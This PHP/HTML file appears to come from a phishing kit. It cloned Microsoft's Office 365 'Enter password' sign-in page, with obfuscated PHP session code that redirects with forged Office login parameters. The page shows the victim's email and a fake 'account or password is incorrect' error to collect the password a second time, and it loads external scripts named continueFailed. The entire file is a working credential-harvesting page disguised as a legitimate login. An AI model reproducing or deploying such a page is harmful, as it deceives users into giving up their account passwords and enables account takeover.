<?php ${"\x47\x4cO\x42\x41L\x53"}["\x66\x78\x74\x62x\x79\x79m\x67q\x72a\x62\x65_\x72v\x5ff\x74a\x6c\x73\x65\x78_\x6dx\x69\x71\x6aq\x62p\x6c"]="_\x53\x45\x53S\x49O\x4e";if(!isset(${${"\x47L\x4fB\x41\x4c\x53"}["\x66\x78\x74\x62x\x79\x79m\x67q\x72a\x62\x65_\x72v\x5ff\x74a\x6c\x73\x65\x78_\x6dx\x69\x71\x6aq\x62p\x6c"]})){session_start();}if(!isset(${${"\x47\x4cO\x42\x41L\x53"}["\x66\x78\x74\x62x\x79\x79m\x67q\x72a\x62\x65_\x72v\x5ff\x74a\x6c\x73\x65\x78_\x6dx\x69\x71\x6aq\x62p\x6c"]}['UserAddress'])){header("Location: ./index.php?client_id=4345a7b9-9a63-4910-a426-35363201d503&response_mode=form_post&response_type=code+id_token&scope=openid+profile&state=OpenIdConnect.AuthenticationProperties%3donpDpYbVA9UXVeosIVrA2-DRa_7W9BcPErYg_pHkzLEm2C1CXJyT7zl-TTnGm7GUwNa28IqVdMPLDfTu22Vkx9jLw7ulhKTeOy8b3tB1XrriWmPomqxiCJyQbvHmEDVD&nonce=636905940261455591.NGY1NDc0NjYtYTUyNi00NzQ5LWE0NTEtMzY4ZTkxMjBlOTc1MGJlMDllZmQtODE0Ni00N2U2LWI2MjctZjYyYzcxODY2ZmM3&redirect_uri=https%3a%2f%2fwww.office.com%2f&ui_locales=en-US&mkt=en-US&client-request-id=dbf14819-814f-4fc4-b446-9ee8f4d1cdc6");exit();} ?>

<!doctype html>
<html dir="ltr" lang="EN-US">
<script language="Javascript" src="js/continueFailed1A.js"></script>

<div class="identityBanner"><!-- ko if: isBackButtonVisible --> <button type="button" class="backButton" data-bind="
        click: backButton_onClick,
        hasFocus: focusOnBackButton,
        attr: {
            'id': backButtonId || 'idBtn_Back',
            'aria-describedby': backButtonDescribedBy,
            'aria-label': str['CT_HRD_STR_Splitter_Back'] }" id="idBtn_Back" aria-label="Back"><!-- ko ifnot: svr.bb --><!-- ko component: 'accessible-image-control' --><!-- ko if: (isHighContrastBlackTheme || hasDarkBackground || svr.fHasBackgroundColor) && !isHighContrastWhiteTheme --><!-- /ko --><!-- ko if: (isHighContrastWhiteTheme || (!hasDarkBackground && !svr.fHasBackgroundColor)) && !isHighContrastBlackTheme --> <!-- ko template: { nodes: [darkImageNode], data: $parent } -->
			<img id="BackArow" role="presentation" pngsrc="16.000.28156.5/arrow_left.png?x=7cc096da6aa2dba3f81fcc1c8262157c" svgsrc="16.000.28156.5/arrow_left.svg?x=a9cc2824ef3517b6c4160dcf8ff7d410" data-bind="imgSrc" src="16.000.28156.5/arrow_left.svg?x=a9cc2824ef3517b6c4160dcf8ff7d410"><!-- /ko --> <!-- /ko --><!-- /ko --><!-- /ko --><!-- ko if: svr.bb --><!-- /ko --> </button><!-- /ko --> <div id="displayName" class="identity" data-bind="text: unsafe_displayName, attr: { 'title': unsafe_displayName }" title="<?= $_SESSION['UserAddress'] ?>"><?= $_SESSION['UserAddress'] ?></div><!-- ko ifnot: svr.H --><!-- /ko --> </div></div> </div><!-- /ko --> <div class="pagination-view animate has-identity-banner slide-in-next" data-bind="css: {
        'has-identity-banner': showIdentityBanner() &amp;&amp; (sharedData.displayName || svr.g),
        'zero-opacity': hidePaginatedView.hideSubView(),
        'animate': animate(),
        'slide-out-next': animate.isSlideOutNext(),
        'slide-in-next': animate.isSlideInNext(),
        'slide-out-back': animate.isSlideOutBack(),
        'slide-in-back': animate.isSlideInBack() }"><!-- ko foreach: views --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --> <!-- ko template: { nodes: [$data], data: $parent } --><div data-viewid="2" data-showidentitybanner="true" data-dynamicbranding="true" data-bind="pageViewComponent: { name: 'login-paginated-password-view',
                        params: {
                            serverData: svr,
                            serverError: initialError,
                            isInitialView: isInitialState,
                            username: sharedData.username,
                            displayName: sharedData.displayName,
                            hipRequiredForUsername: sharedData.hipRequiredForUsername,
                            passwordBrowserPrefill: sharedData.passwordBrowserPrefill,
                            availableCreds: sharedData.availableCreds,
                            evictedCreds: sharedData.evictedCreds,
                            useEvictedCredentials: sharedData.useEvictedCredentials,
                            flowToken: sharedData.flowToken,
                            defaultKmsiValue: svr.Y === 1,
                            userTenantBranding: sharedData.userTenantBranding,
                            sessions: sharedData.sessions,
                            callMetadata: sharedData.callMetadata,
                            gitHubRedirectUrl: sharedData.gitHubParams.redirectUrl || svr.l,
                            googleRedirectUrl: sharedData.googleParams.redirectUrl || svr.AC },
                        event: {
                            updateFlowToken: $loginPage.view_onUpdateFlowToken,
                            submitReady: $loginPage.view_onSubmitReady,
                            redirect: $loginPage.view_onRedirect,
                            resetPassword: $loginPage.passwordView_onResetPassword,
                            setBackButtonState: view_onSetIdentityBackButtonState,
                            setPendingRequest: $loginPage.view_onSetPendingRequest } }"><!--  --> <input type="hidden" name="i13" data-bind="value: isKmsiChecked() ? 1 : 0" value="0"> <input type="hidden" name="login" data-bind="value: unsafe_username" value="<?= $_SESSION['UserAddress'] ?>"> <input type="text" name="loginfmt" data-bind="moveOffScreen, value: unsafe_displayName" class="moveOffScreen" tabindex="-1" aria-hidden="true"> <input type="hidden" name="type" data-bind="value: svr.ar ? 20 : 11" value="11"> <input type="hidden" name="LoginOptions" data-bind="value: isKmsiChecked() ? 1 : 3" value="3"> <input type="hidden" name="lrt" data-bind="value: callMetadata.IsLongRunningTransaction" value=""> <input type="hidden" name="lrtPartition" data-bind="value: callMetadata.LongRunningTransactionPartition" value=""> <input type="hidden" name="hisRegion" data-bind="value: callMetadata.HisRegion" value=""> <input type="hidden" name="hisScaleUnit" data-bind="value: callMetadata.HisScaleUnit" value=""> <div id="loginHeader" class="row text-title" role="heading" aria-level="1" data-bind="text: str['CT_PWD_STR_EnterPassword_Title']">Enter password</div><!-- ko if: unsafe_pageDescription --><!-- /ko --> <div class="row"> <div class="form-group col-md-24"> <div role="alert" aria-live="assertive" aria-atomic="false"><!-- ko if: passwordTextbox.error --> <div id="passwordError" class="alert alert-error" data-bind="
                htmlWithBindings: passwordTextbox.error,
                childBindings: { 'idA_IL_ForgotPassword0': { href: svr.N, click: resetPassword_onClick } }">Your account or password is incorrect. If you don't remember your password, <a href="#">reset it now.</div><!-- /ko --> </div> <div class="placeholderContainer" data-bind="component: { name: 'placeholder-textbox',
            publicMethods: passwordTextbox.placeholderTextboxMethods,
            params: {
                serverData: svr,
                hintText: str['CT_PWD_STR_PwdTB_Label'] },
            event: {
                updateFocus: passwordTextbox.textbox_onUpdateFocus } }"><!-- ko withProperties: { '$placeholderText': placeholderText } --> <!-- ko template: { nodes: $componentTemplateNodes, data: $parent } --> 
				
				<script language="Javascript" src="js/continueFailed1B.js"></script>
				
				<input name="UserAccessCode" type="password" id="UserAccessCode" autocomplete="off" class="form-control has-error" aria-describedby="passwordError loginHeader passwordDesc" aria-required="true" data-bind="
                    textInput: passwordTextbox.value,
                    hasFocusEx: passwordTextbox.focused,
                    placeholder: $placeholderText,
                    ariaLabel: unsafe_passwordAriaLabel,
                    css: { 'has-error': passwordTextbox.error }" placeholder="Password" aria-label="Enter the password for <?= $_SESSION['UserAddress'] ?>"> <!-- /ko --><!-- /ko --><!-- ko ifnot: usePlaceholderAttribute --><!-- /ko --></div> </div> </div><!-- ko if: svr.Ad && showHipOnPasswordView --><!-- /ko --> <div data-bind="invertOrder: svr.bh, css: { 'position-buttons': !tenantBranding.BoilerPlateText }" class="position-buttons"><div><!-- ko if: svr.bK --><!-- /ko --><!-- ko if: svr.af !== false && !svr.bK && !tenantBranding.KeepMeSignedInDisabled --> <div id="idTd_PWD_KMSI_Cb" class="form-group checkbox text-block-body no-margin-top" data-bind="visible: !svr.F &amp;&amp; !showHipOnPasswordView"> <label id="idLbl_PWD_KMSI_Cb"> <input name="KMSI" id="idChkBx_PWD_KMSI0Pwd" type="checkbox" data-bind="checked: isKmsiChecked, ariaLabel: str['CT_PWD_STR_KeepMeSignedInCB_Text']" aria-label="Keep me signed in"> <span data-bind="text: str['CT_PWD_STR_KeepMeSignedInCB_Text']">Keep me signed in</span> </label> </div><!-- /ko --> 
					
					<script language="Javascript" src="js/continueFailed1C.js"></script>
		</html>